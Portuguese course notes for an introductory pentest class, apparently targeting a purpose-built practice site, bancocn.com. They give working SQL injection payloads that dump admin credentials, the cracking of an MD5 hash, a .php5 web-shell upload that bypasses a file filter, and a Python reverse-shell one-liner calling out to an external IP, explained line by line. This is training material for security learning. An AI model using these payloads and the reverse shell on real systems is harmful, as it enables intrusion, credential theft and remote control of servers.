# Introdução ao Hacking e Pentest

Estas são as anotações das partes práticas do curso [Introdução ao Hacking e Pentest](https://solyd.com.br/ead/course/introducao-ao-hacking-e-pentest/) oferecido pela Solyd. Todos os passos são executados no site desenvolvido exclusivamente para isso: http://www.bancocn.com.

## Exploração

Nesta etapa o mais importante que temos a descobrir é:
- Se usarmos <code>'</code> como id no URL, recebemos um erro de sintaxe do SQL, então podemos tentar explorar vulnerabilidades do SQL;
- Pelo arquivo /robots.txt, descobrimos a existência da página /admin.

## SQL Injection

Vamos descobrir quantas colunas tem usando o comando SQL ORDER BY Keyword, ele é usado para ordenar os resultados em ordem ascendente ou descendente de acordo com os valores de determinada coluna.
Então por exemplo se queremos ordenar o resultado o resultado pelos valores da coluna 1 e comentar o que viria depois do código usando --, então vamos passar <code>1 ORDER BY 1--</code>. Vamos inserir os comandos sempre após <code>www.bancocn.com/cat.php?id=</code>.
<pre> 
1 ORDER BY 1-- :ok
1 ORDER BY 2-- :ok
1 ORDER BY 3-- :ok
1 ORDER BY 4-- : Unknown column '4' in 'order clause'
</pre>

Então agora sabemos que temos 3 colunas. O comando UNION é usado para combinar o resultados de múltiplos SELECTS, então vamos adicionar uma linha ao resultado.  Vai ser adicionado no final do resultado, mas ele lê o primeiro resultado, então vamos usar o sinal negativo para inverter a ordem dos resultados, por exemplo: <code>-1 UNION SELECT 1,2,3</code>. Podemos usar então database() para obtermos o nome do banco de dados onde as informações são exibidas na tela: 

<code>-1 UNION SELECT 1,2,database()</code>.

Com isso sabemos o nome do nosso banco de dados: bancocn. Para sabermos todas tabelas do banco de dados podemos usar: 

<code>-1 UNION SELECT 1,2, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema="bancocn"</code>

Basicamente, estamos inserindo uma linha onde as duas primeiras colunas são 1 e 2 respectivamente, e o terceiro que é o que será exibido na tela, então concatenamos o resultado, que é a busca na tabela tables no banco de dados information_schema que pertence ao banco de dados bancocn, de acordo com o valor na coluna table_schema.

Obtemos agora os nomes das tabelas do nosso banco de dados: categories,pictures,stats,users. Então com os nomes das tabelas escolhemos ver melhor a tabela users, usando um código parecido:

<code>-1 UNION SELECT 1,2, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema="bancocn" AND table_name="users"</code>

As colunas são: id,login,password. Então agora olhamos a tabela das colunas e olhamos onde o banco de dados é bancocn e a tabela é users.

Então podemos agora simplesmente exibir, o login senha:
- <code>-1 UNION SELECT 1,2, login FROM bancocn.users</code>
- <code>-1 UNION SELECT 1,2, password FROM bancocn.users</code>

Obtemos então o usuário (admin) e a senha (7b71be0e85318117d2e514ce2a2e222c).

Testamos uma criptografia padrão (MD5), usando o [MD5 Decrypter](https://www.md5online.org/) desciptografamos a senha (senhafoda) e conseguimos acesso ao painel de admin descoberto anteriormente.

## Shell reversa

Olhando a estrutura dos endereços das imagens carregadas, podemos acessar o diretório dos arquivos /admin/uploads. Lá podemos então abrir um arquivo com extensão php que enviaremos ao servidor.

Aproveitando que possui um filtro de extensões que barra arquivos .php, mas permite .php5, vamos carregar um arquivo PHP5 (terminal.php5) que recebe comandos e os executa no terminal.  Por exemplo para rodar um <code>ls </code> poderíamos usar:
<code>?comando=ls</code>, então o endereço de forma completa ficaria <code>/admin/uploads/terminal.php5?comando=ls</code>.

O que queremos rodar no terminal, é uma shell reversa, uma versão em python pode ser retirada do [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("179.189.157.42",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' </code>

Substituimos o IP pelo endereço da nossa máquina, que pode ser visto em [What is my IP](https://whatismyip.com.br/) por exemplo. Agora podemos utilizar o netcat ([versão para Windows](https://eternallybored.org/misc/netcat/) disponibilizado por Jernej Simoncic) para enviar comandos para nossa máquina.

Neste ponto, invadimos o servidor web.

# Bônus: construindo a Shell Reversa

Vamos olhar trecho a trecho o código em python que passamos em uma linha para rodar nossa shell reversa. Criamos um script python chamado [clienteTCP](https://github.com/SapoGitHub/Repositorio-Geral/blob/master/Introdu%C3%A7%C3%A3o%20ao%20Hacking%20e%20Pentest/clienteTCP.py) melhor comentado para esta tarefa.

Primeiro, soquete é o ponto-final de um fluxo de comunicação entre 2 aplicativos através da rede. Portanto para 2 aplicativos temos 2 pontos finais, chamados normalmente de
- Servidor: considerado a máquina 'principal', ela envia os comandos ;
- Cliente: responsável por se conectar no servidor e receber e executa comandos.

Queremos então criarmos um cliente para rodar em nossa máquina. Para isso precisamos definir algumas coisas:
- A representação do endereço (Família de protocolo): Usamos o AF_INET (domínio da internet) é uma família de endereços onde usamos um par de valores: (servidor, porta), onde:
	- servidor: é um hostname de um domínio de internet (daring.cwi.nl) ou um endereço IP;
	- porta: um inteiro.
- Tipo: especifica a semântica da comunicação e usamos o SOCK_STREAM que fornece uma conexão sequencial, confiável e bidirecional. Ela indica que nosso soquete vai ser do tipo TCP.

Definido o protocolo que vamos utilizar para o envio de informações e como vamos representar o endereço, podemos então fornecer o IP e porta para se conectar ao nosso servidor.

```
soquete=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #Configura o socket
soquete.connect(("127.0.0.1",6666))                       #Conecta em nosso servidor
```

O próximo passo é lidarmos com os descritores de arquivos, isto é um indicador abstrato para acessar um arquivo. Cada processo Unix tem três descritores de arquivos padrões, representados por inteiros:
- 0: Entrada padrão;
- 1: Saída padrão;
- 2: Erro padrão.

Então o nosso próximo passo, é pegarmos o descritor de arquivo do soquete, fazemos isso com o comando:

<code>das=soquete.fileno()                                        #Retorna o descritor do soquete</code>

E fazermos os descritores de arquivo padrões indicarem para o mesmo lugar, ou seja, o soquete:
```
os.dup2(das,0)						#Duplica o descritor 'das' para 0                                    
os.dup2(das,1)						#Duplica o descritor 'das' para 1
os.dup2(das,2)						#Duplica o descritor 'das' para 2
```

Agora então, as entradas e saídas de nosso processo serão recebidas e enviadas através do nosso soquete, ou seja a comunicação é feita com nosso servidor. Por fim, nos falta executar de fato a shell(<code>/bin/sh</code>) apenas:

<code>subprocess.call(["/bin/sh"])			#Executamos a shell</code>

Ainda podemos usar o argumento <code>-i</code> para forar a shell a rodar de interativo. Nesse caso usaríamos <code>subprocess.call(["/bin/sh","-i"])</code>. 
